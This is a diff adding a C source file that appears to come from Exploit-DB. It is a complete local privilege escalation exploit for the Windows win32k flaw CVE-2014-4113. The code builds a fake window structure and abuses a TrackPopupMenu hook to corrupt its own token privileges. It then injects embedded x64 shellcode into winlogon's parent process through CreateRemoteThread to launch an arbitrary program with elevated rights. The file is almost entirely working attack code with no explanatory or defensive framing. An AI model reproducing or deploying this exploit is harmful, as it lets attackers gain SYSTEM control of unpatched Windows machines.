@@ -1,0 +1,540 @@
+#include "hd.h"
+
+// EDB Note ~ Download: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46945.rar
+
+
+byte __s_code[]={
+	0x48 ,0x8B ,0xC4 ,0x48 ,0x89 ,0x58 ,0x08 ,0x48 ,0x89 ,0x68 ,0x20 ,0x56 ,0x57 ,0x41 ,0x56 ,0x48 ,
+	0x81 ,0xEC ,0xE0 ,0x00 ,0x00 ,0x00 ,0x45 ,0x33 ,0xF6 ,0x49 ,0x89 ,0xCB ,0x4C ,0x89 ,0x70 ,0x18 ,
+	0x4C ,0x89 ,0x70 ,0x10 ,0x90 ,0x65 ,0x48 ,0x8B ,0x04 ,0x25 ,0x30 ,0x00 ,0x00 ,0x00 ,0x48 ,0x8B ,
+	0x40 ,0x60 ,0x90 ,0x90 ,0x90 ,0x90 ,0x48 ,0x8B ,0x78 ,0x18 ,0x48 ,0x8B ,0x47 ,0x10 ,0x48 ,0x83 ,
+	0xC7 ,0x10 ,0x48 ,0x3B ,0xC7 ,0x0F ,0x84 ,0x99 ,0x01 ,0x00 ,0x00 ,0x48 ,0xBB ,0x65 ,0x00 ,0x6C ,
+	0x00 ,0x33 ,0x00 ,0x32 ,0x00 ,0x48 ,0xBE ,0x2E ,0x00 ,0x64 ,0x00 ,0x6C ,0x00 ,0x6C ,0x00 ,0x49 ,
+	0xBA ,0x6B ,0x00 ,0x65 ,0x00 ,0x72 ,0x00 ,0x6E ,0x00 ,0x48 ,0xBD ,0x4B ,0x00 ,0x45 ,0x00 ,0x52 ,
+	0x00 ,0x4E ,0x00 ,0x49 ,0xB8 ,0x45 ,0x00 ,0x4C ,0x00 ,0x33 ,0x00 ,0x32 ,0x00 ,0x49 ,0xB9 ,0x2E ,
+	0x00 ,0x44 ,0x00 ,0x4C ,0x00 ,0x4C ,0x00 ,0x66 ,0x0F ,0x1F ,0x84 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,
+	0x66 ,0x83 ,0x78 ,0x58 ,0x18 ,0x48 ,0x8B ,0x48 ,0x60 ,0x72 ,0x25 ,0x48 ,0x8B ,0x11 ,0x49 ,0x3B ,
+	0xD2 ,0x75 ,0x0C ,0x48 ,0x39 ,0x59 ,0x08 ,0x75 ,0x06 ,0x48 ,0x39 ,0x71 ,0x10 ,0x74 ,0x1E ,0x48 ,
+	0x3B ,0xD5 ,0x75 ,0x0C ,0x4C ,0x39 ,0x41 ,0x08 ,0x75 ,0x06 ,0x4C ,0x39 ,0x49 ,0x10 ,0x74 ,0x0D ,
+	0x48 ,0x8B ,0x00 ,0x48 ,0x3B ,0xC7 ,0x75 ,0xC8 ,0xE9 ,0x17 ,0x01 ,0x00 ,0x00 ,0x48 ,0x8B ,0x78 ,
+	0x30 ,0x48 ,0x85 ,0xFF ,0x0F ,0x84 ,0x0A ,0x01 ,0x00 ,0x00 ,0x48 ,0x63 ,0x47 ,0x3C ,0xB9 ,0x4D ,
+	0x5A ,0x00 ,0x00 ,0x66 ,0x39 ,0x0F ,0x0F ,0x85 ,0xF8 ,0x00 ,0x00 ,0x00 ,0x81 ,0x3C ,0x38 ,0x50 ,
+	0x45 ,0x00 ,0x00 ,0x0F ,0x85 ,0xEB ,0x00 ,0x00 ,0x00 ,0x44 ,0x8B ,0x8C ,0x38 ,0x88 ,0x00 ,0x00 ,
+	0x00 ,0x49 ,0x8B ,0xD6 ,0x4C ,0x03 ,0xCF ,0x45 ,0x8B ,0x41 ,0x20 ,0x41 ,0x8B ,0x49 ,0x18 ,0x4C ,
+	0x03 ,0xC7 ,0x48 ,0x85 ,0xC9 ,0x74 ,0x32 ,0x48 ,0xBB ,0x43 ,0x72 ,0x65 ,0x61 ,0x74 ,0x65 ,0x50 ,
+	0x72 ,0x49 ,0xBA ,0x72 ,0x6F ,0x63 ,0x65 ,0x73 ,0x73 ,0x41 ,0x00 ,0x0F ,0x1F ,0x44 ,0x00 ,0x00 ,
+	0x41 ,0x8B ,0x04 ,0x90 ,0x48 ,0x39 ,0x1C ,0x38 ,0x75 ,0x07 ,0x4C ,0x39 ,0x54 ,0x38 ,0x07 ,0x74 ,
+	0x08 ,0x48 ,0xFF ,0xC2 ,0x48 ,0x3B ,0xD1 ,0x72 ,0xE7 ,0x33 ,0xC0 ,0x48 ,0x3B ,0xD1 ,0x0F ,0x83 ,
+	0x92 ,0x00 ,0x00 ,0x00 ,0x41 ,0x8B ,0x49 ,0x24 ,0x45 ,0x33 ,0xC0 ,0x48 ,0x03 ,0xCF ,0x0F ,0xB7 ,
+	0x14 ,0x51 ,0x41 ,0x8B ,0x49 ,0x1C ,0x45 ,0x33 ,0xC9 ,0x48 ,0x03 ,0xCF ,0x44 ,0x8B ,0x14 ,0x91 ,
+	0x48 ,0x89 ,0x44 ,0x24 ,0x58 ,0x48 ,0x89 ,0x44 ,0x24 ,0x60 ,0x4C ,0x03 ,0xD7 ,0x48 ,0x8D ,0x7C ,
+	0x24 ,0x70 ,0xB9 ,0x68 ,0x00 ,0x00 ,0x00 ,0xF3 ,0xAA ,0xB8 ,0x05 ,0x00 ,0x00 ,0x00 ,0x49 ,0x8B ,
+	0xD3 ,0x66 ,0x89 ,0x84 ,0x24 ,0xB0 ,0x00 ,0x00 ,0x00 ,0x48 ,0x8D ,0x44 ,0x24 ,0x50 ,0x33 ,0xC9 ,
+	0x48 ,0x89 ,0x44 ,0x24 ,0x48 ,0x48 ,0x8D ,0x44 ,0x24 ,0x70 ,0x4C ,0x89 ,0x74 ,0x24 ,0x50 ,0x48 ,
+	0x89 ,0x44 ,0x24 ,0x40 ,0x4C ,0x89 ,0x74 ,0x24 ,0x38 ,0x4C ,0x89 ,0x74 ,0x24 ,0x30 ,0xC7 ,0x44 ,
+	0x24 ,0x28 ,0x10 ,0x00 ,0x00 ,0x00 ,0xC7 ,0x44 ,0x24 ,0x70 ,0x68 ,0x00 ,0x00 ,0x00 ,0xC7 ,0x84 ,
+	0x24 ,0xAC ,0x00 ,0x00 ,0x00 ,0x01 ,0x00 ,0x00 ,0x00 ,0xC7 ,0x44 ,0x24 ,0x20 ,0x01 ,0x00 ,0x00 ,
+	0x00 ,0x41 ,0xFF ,0xD2 ,0x33 ,0xC0 ,0x4C ,0x8D ,0x9C ,0x24 ,0xE0 ,0x00 ,0x00 ,0x00 ,0x49 ,0x8B ,
+	0x5B ,0x20 ,0x49 ,0x8B ,0x6B ,0x38 ,0x49 ,0x8B ,0xE3 ,0x41 ,0x5E ,0x5F ,0x5E ,0xC3
+};
+
+
+
+
+HMENU __init_menu(
+	)
+{
+	HMENU hMenu_Ret=NULL;
+	MENUITEMINFO mItem={0};
+
+	do 
+	{
+		HMENU hme=CreatePopupMenu();
+		if (hme==NULL){
+			printf("CreatePopupMenu()_1 fail:0x%x\n" ,GetLastError());
+			break;
+		}
+
+		mItem.cbSize=sizeof(MENUITEMINFO);
+		mItem.fMask=(MIIM_STRING);
+
+		bool bisok=InsertMenuItem(hme ,0 ,1 ,&mItem);
+		if (bisok==false){
+			printf("InsertMenuItem()_1 fail:0x%x\n" ,GetLastError());
+			break;
+		}
+
+		hMenu_Ret=CreatePopupMenu();
+		if (hMenu_Ret==NULL){
+			printf("CreatePopupMenu()_2 fail:0x%x\n" ,GetLastError());
+			break;
+		}
+
+		MENUITEMINFO mi={0};
+		mi.cbSize=sizeof(mi);
+		mi.fMask=(MIIM_STRING|MIIM_SUBMENU);
+		mi.hSubMenu=hme;
+		mi.dwTypeData="";
+		mi.cch=1;
+
+		bisok=InsertMenuItem(hMenu_Ret ,0 ,1 ,&mi);
+		if (bisok==false){
+			printf("InsertMenuItem()_2 fail: 0x%x\n" ,GetLastError());
+		}
+
+	} while (false);
+
+	return hMenu_Ret;
+}
+
+
+PVOID __calc_sep_token_addr(
+	)
+{
+	NTSTATUS status;
+	PSYSTEM_HANDLE_INFORMATION handleInfo=NULL;
+	ULONGLONG handleInfoSize = 0x10000 ,i ,ret_obj_addr=NULL; 
+
+	do 
+	{
+		_NtQuerySystemInformation NtQuerySystemInformation = 
+			(_NtQuerySystemInformation)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQuerySystemInformation");
+
+		_NtDuplicateObject NtDuplicateObject =
+			(_NtDuplicateObject)GetProcAddress(LoadLibrary("ntdll.dll"), "NtDuplicateObject");
+
+		_NtQueryObject NtQueryObject =
+			(_NtQueryObject)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryObject");
+
+
+		if (!NtQuerySystemInformation || !NtDuplicateObject || !NtQueryObject){
+			printf("get sys proc failed!\n");
+			break;
+		}
+
+		handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
+
+		while ((status = NtQuerySystemInformation(SystemHandleInformation,handleInfo,
+			handleInfoSize,NULL)) == STATUS_INFO_LENGTH_MISMATCH)
+			handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
+
+		if (!NT_SUCCESS(status)){
+			printf("NtQuerySystemInformation failed!\n");
+			break;
+		}
+
+
+		POBJECT_TYPE_INFORMATION objectTypeInfo=(POBJECT_TYPE_INFORMATION)malloc(0x1000);
+
+		for (i = 0; i < handleInfo->HandleCount; i++)
+		{
+			SYSTEM_HANDLE handle = handleInfo->Handles[i];
+
+			if (handle.ProcessId != GetCurrentProcessId())
+				continue;
+
+			if (!NT_SUCCESS(NtQueryObject(
+				(HANDLE)handle.Handle,
+				ObjectTypeInformation,
+				objectTypeInfo,
+				0x1000,
+				NULL
+				)))
+			{
+				printf("[%#x] Error!\n", handle.Handle);
+				continue;
+			}
+
+			if (objectTypeInfo->Name.Buffer==NULL || objectTypeInfo->Name.Length==0)
+				continue;
+
+			if (wcscmp(objectTypeInfo->Name.Buffer ,L"Token"))
+				continue;
+
+			ret_obj_addr=((ULONGLONG)handle.Object+0x40);
+		}
+
+		if (objectTypeInfo)
+			free(objectTypeInfo);
+
+		if (handleInfo)
+			free(handleInfo);
+
+	} while (false);
+
+	return (PVOID)ret_obj_addr;
+}
+
+
+ULONGLONG __calc_pid(
+	)
+{
+	NTSTATUS status;
+	PSYSTEM_PROCESS_INFORMATION PsInfo=NULL;
+	ULONGLONG PsInfoSize = 0x10000 ,ret_pid=NULL; 
+
+	do 
+	{
+		_NtQuerySystemInformation NtQuerySystemInformation = 
+			(_NtQuerySystemInformation)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQuerySystemInformation");
+
+
+		if (!NtQuerySystemInformation){
+			printf("get sys proc failed!\n");
+			break;
+		}
+
+		PsInfo = (PSYSTEM_PROCESS_INFORMATION)malloc(PsInfoSize);
+
+		while ((status = NtQuerySystemInformation(SystemProcessesAndThreadsInformation,PsInfo,
+			PsInfoSize ,NULL)) == STATUS_INFO_LENGTH_MISMATCH)
+			PsInfo = (PSYSTEM_PROCESS_INFORMATION)realloc(PsInfo, PsInfoSize*= 2);
+
+		if (!NT_SUCCESS(status)){
+			printf("NtQuerySystemInformation failed!\n");
+			break; 
+		}
+
+		for (;PsInfo->NextEntryDelta ;PsInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONGLONG)PsInfo + PsInfo->NextEntryDelta))
+		{
+			if (PsInfo->ProcessName.Buffer==NULL || PsInfo->ProcessName.Length==0)
+				continue;
+
+			if (!wcscmp(PsInfo->ProcessName.Buffer ,L"winlogon.exe")){
+				ret_pid=PsInfo->InheritedFromProcessId;
+				break;
+			}
+		}
+
+	} while (false);
+
+	return ret_pid;
+} 
+
+
+ULONGLONG __init_fake_wnd_pti(
+	)
+{
+	ULONGLONG ret_pti=NULL;
+	ULONGLONG dst_proc_addr=NULL;
+
+	do 
+	{
+		ret_pti=(ULONGLONG)malloc(0x500);
+		if (ret_pti==NULL){
+			printf("malloc fail!\n");
+			return NULL; 
+		}
+
+		*(ULONGLONG*)(ret_pti+_oft_win32ps_pti)=0;  //Win32Process
+		*(DWORD*)(ret_pti+_oft_0420h_pti)=0;		//not 0x20
+		*(ULONGLONG*)(ret_pti+_oft_list_header_pti)=(ULONGLONG)__calc_sep_token_addr()-0x5;  //TODO:
+
+		void* tmpbuf=malloc(0x100); 
+		memset(tmpbuf ,0 ,0x100);
+		*(ULONGLONG*)(ret_pti+_oft_0188h_pti)=(ULONGLONG)tmpbuf; //buf addr(size >= 0x12) ,check in win32k!SetWakeBit
+
+	} while (false);
+
+	return ret_pti;
+}
+
+
+
+bool __init_fake_tagWnd(
+	)
+{
+	bool bRet=false;
+	_ZwAllocateVirtualMemory_pt pfn_ZwAllocateVm=NULL;
+
+	do 
+	{
+		HMODULE hmd=LoadLibrary("ntdll.dll");
+		if (hmd==NULL)
+			break;
+
+		ULONGLONG fake_tagwnd_pti=__init_fake_wnd_pti();
+		if (fake_tagwnd_pti==NULL){
+			printf("__calc_wnd_pti() fail!\n");
+			break;
+		}
+
+
+		pfn_ZwAllocateVm=(_ZwAllocateVirtualMemory_pt)GetProcAddress(hmd ,"ZwAllocateVirtualMemory");
+		if (pfn_ZwAllocateVm==NULL){
+			printf("pfn ZwAllocateVirtualMemery addr is NULL!\n");
+			break;
+		}
+
+		BYTE* fake_tagWnd_addr=(BYTE*)0xFFFFFFFB; size_t region_size=0x20000;
+		NTSTATUS status=pfn_ZwAllocateVm(GetCurrentProcess() ,(PVOID*)&fake_tagWnd_addr ,0 ,&region_size,
+			MEM_RESERVE | MEM_COMMIT|MEM_TOP_DOWN ,PAGE_EXECUTE_READWRITE);
+
+		if (status < 0){
+			printf("Allocate fake tagWnd fail!\n");
+			break;;
+		}
+
+		ULONGLONG ul_align=0xFFFFFFFBLL-(ULONGLONG)fake_tagWnd_addr;
+		if (ul_align > 0x10000){
+			printf("alloc fake fail: %x!\n" ,fake_tagWnd_addr);
+			break;
+		}
+
+		memset(fake_tagWnd_addr+ul_align ,0 ,0x1000);
+
+		*(ULONGLONG*)(fake_tagWnd_addr+ul_align+_oft_idx_tagWND)=0x0;
+		*(ULONGLONG*)(fake_tagWnd_addr+ul_align+_oft_pti_tagWnd)=fake_tagwnd_pti; //oft 0x170 == win32process
+		*(ULONGLONG*)(fake_tagWnd_addr+ul_align+_oft_18h_tagWnd)=0x0; //0 ,check in IsWindowDesktopComposed
+
+		bRet=true;
+
+	} while (false);
+
+	return bRet;
+}
+
+
+
+LRESULT __stdcall __wh_wnd_proc( 
+	int code, 
+	WPARAM wparam,
+	LPARAM lparam 
+	)
+{
+	do 
+	{
+		CWPSTRUCT* lpm=(CWPSTRUCT*)lparam;
+		if (lpm->message != MN_FINDWINDOWFROMPOINT || g_bis_mn_findwnded==true)
+			break;
+
+		g_bis_mn_findwnded=true;
+
+		UnhookWindowsHook(WH_CALLWNDPROC ,__wh_wnd_proc);
+
+		g_ori_wnd_proc=(WNDPROC)SetWindowLongPtr(lpm->hwnd ,GWLP_WNDPROC ,(LONG_PTR)__wnd_proc_sl);
+
+	} while (false);
+
+	return CallNextHookEx(g_hhk ,code ,wparam ,lparam);
+}
+
+
+
+
+LRESULT __wnd_proc_sl( 
+	HWND hwnd,
+	UINT umsg,
+	WPARAM wparam, 
+	LPARAM lparam
+	)
+{
+	do 
+	{
+		if (umsg != MN_FINDWINDOWFROMPOINT )
+			break;
+
+		if (g_bis_endmenu)
+			break;
+
+		g_bis_endmenu=1;
+
+		EndMenu();
+		return 0xFFFFFFFB;
+
+	} while (false);
+
+	return CallWindowProc(g_ori_wnd_proc ,hwnd ,umsg ,wparam ,lparam);
+}
+
+
+
+LRESULT __stdcall __wnd_proc(
+	HWND hwnd, 
+	UINT umsg, 
+	WPARAM wparam, 
+	LPARAM lparam
+	)
+{
+	if (umsg==WM_ENTERIDLE && g_bis_idled==FALSE)
+	{
+		g_bis_idled=TRUE;
+		PostMessage(hwnd ,WM_KEYFIRST ,0x28 ,0);    
+		PostMessage(hwnd ,WM_KEYFIRST ,0X27 ,0);   
+		PostMessage(hwnd ,WM_LBUTTONDOWN ,0 ,0xff00ff);  
+	}
+
+	return DefWindowProc(hwnd ,umsg ,wparam ,lparam);
+}
+
+
+DWORD __stdcall __thread_plroc( 
+	void*  param
+	)
+{
+	bool bisok=false;
+	WNDCLASS wndcls={0};
+
+	do 
+	{
+		wndcls.lpfnWndProc=__wnd_proc;
+		wndcls.lpszClassName="cve_2014_4113";
+		RegisterClass(&wndcls);
+
+		HWND hwnd=CreateWindowEx(0 ,wndcls.lpszClassName ,NULL ,0 ,0 ,0,
+			200 ,200 ,NULL ,NULL ,NULL ,NULL);
+		if (hwnd==NULL){
+			printf("CreateWindowEx() fail: 0x%x\n" ,GetLastError());
+			break;
+		}
+
+		HMENU hmenu=__init_menu();
+		if (hmenu==NULL){
+			printf("__init_menu() fail: 0x%x\n" ,GetLastError());
+			break;
+		}
+
+		
+		bool bisok=__init_fake_tagWnd();
+		if (bisok==false){
+			printf("__init_fake_tagWnd() fail:0x%x\n" ,GetLastError());
+			break;
+		}
+		
+		g_hhk=SetWindowsHookEx(WH_CALLWNDPROC ,__wh_wnd_proc ,NULL ,GetCurrentThreadId());
+		if (g_hhk==NULL){
+			printf("SetWindowsHookEx() fail:0x%x\n" ,GetLastError());
+			break;
+		}
+
+		bisok=TrackPopupMenu(hmenu ,0 ,0x0FFFFD8F0 ,0x0FFFFD8F0 ,0 ,hwnd ,NULL);
+		if (bisok==false){
+			printf("TrackPopupMenu() fail:0x%x\n" ,GetLastError());
+			break;
+		}
+
+		CloseHandle(hmenu);
+
+		DestroyWindow(hwnd);
+
+	} while (FALSE);
+
+	return 0;
+}
+
+
+
+int main(
+	int argc ,char** argv
+	)
+{
+	bool bisok=false;
+
+	do 
+	{
+		if (argc != 2){
+			printf("usage: xxx fpath");
+			break;
+		}
+
+		HANDLE hProcessToken=NULL ,hRestrictedToken=NULL;
+		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hProcessToken)) {
+			printf("Could not open process token\n");
+			break; 
+		}
+
+		if (!CreateRestrictedToken(hProcessToken, DISABLE_MAX_PRIVILEGE, 0, 0, 0, 0, 0, 0, &hRestrictedToken)){
+			printf("Could not create restricted token\n");
+			break;
+		}
+
+		if (!AdjustTokenPrivileges(hRestrictedToken, TRUE, NULL, 0, NULL, NULL)) {
+			printf("Could not adjust privileges\n");
+			break;
+		}
+		
+		CloseHandle(hProcessToken);
+
+		HANDLE hthread=CreateThread(NULL ,0 ,__thread_plroc ,NULL ,0 ,NULL);
+		if (hthread==NULL){
+			printf("CreateThread() fail: 0x%x\n" ,GetLastError());
+			break;
+		}
+
+		WaitForSingleObject(hthread ,1000);
+		TerminateThread(hthread ,0);
+		
+		if (!ImpersonateLoggedOnUser(hRestrictedToken)){
+			printf("ImpersonateLoggedOnUser failed!\n");
+			break;
+		}
+		
+		PVOID pfn_cps=GetProcAddress(LoadLibrary("Kernel32.dll") ,"CreateProcessA");
+		if (pfn_cps==NULL){
+			printf("GetProcess CreateProcessA failed!\n");
+			break;
+		}
+		
+		ULONGLONG ul_pid_winlogon=__calc_pid();
+		if (ul_pid_winlogon==NULL){
+			printf("__calc_winlogon_pid failed!\n");
+			break;
+		}
+
+
+		HANDLE hprocess=OpenProcess(PROCESS_ALL_ACCESS ,TRUE ,ul_pid_winlogon);
+		if (hprocess==NULL){
+			printf("OpenProcess failed: %x\n" ,GetLastError());
+			break;
+		}
+
+
+		//init params
+		PVOID params=VirtualAllocEx(hprocess ,NULL ,strlen(argv[1])+10 ,MEM_COMMIT ,PAGE_READWRITE);
+		if (params==NULL){
+			printf("VirtualAllocEx failed:%x\n" ,GetLastError());
+			break;
+		}
+
+		ULONGLONG ul_ret_wrt=0;
+		bisok=WriteProcessMemory(hprocess ,params ,argv[1] ,strlen(argv[1])+2 ,(SIZE_T*)&ul_ret_wrt);
+		if (bisok==false || ul_ret_wrt < strlen(argv[1])+2){
+			printf("WriteProcessMemory() failed!\n");
+			break;
+		} 
+
+
+		//init shellcode
+
+		PVOID shellcode=VirtualAllocEx(hprocess ,NULL ,0x220 ,MEM_COMMIT ,PAGE_EXECUTE_READWRITE);
+		if (shellcode==NULL){
+			printf("VirtualAllocEx failed:%x\n" ,GetLastError());
+			break;
+		}
+
+		bisok=WriteProcessMemory(hprocess ,shellcode ,__s_code ,sizeof(__s_code) ,(SIZE_T*)&ul_ret_wrt);
+		if (bisok==false || ul_ret_wrt < sizeof(__s_code)){
+			printf("WriteProcessMemory() failed!\n");
+			break;
+		}
+
+		DWORD dw_tid=0;
+		HANDLE htd_rmt=CreateRemoteThread(hprocess ,NULL ,0 ,(LPTHREAD_START_ROUTINE )shellcode ,params ,0 ,&dw_tid);
+		if (htd_rmt==NULL){
+			printf("CreateRemoteThread() fail!\n");
+			break;
+		}
+
+
+		//clear
+
+		CloseHandle(htd_rmt);
+
+		CloseHandle(hprocess);
+
+		CloseHandle(hRestrictedToken);
+
+	} while (false);
+	
+	return 0;
+}
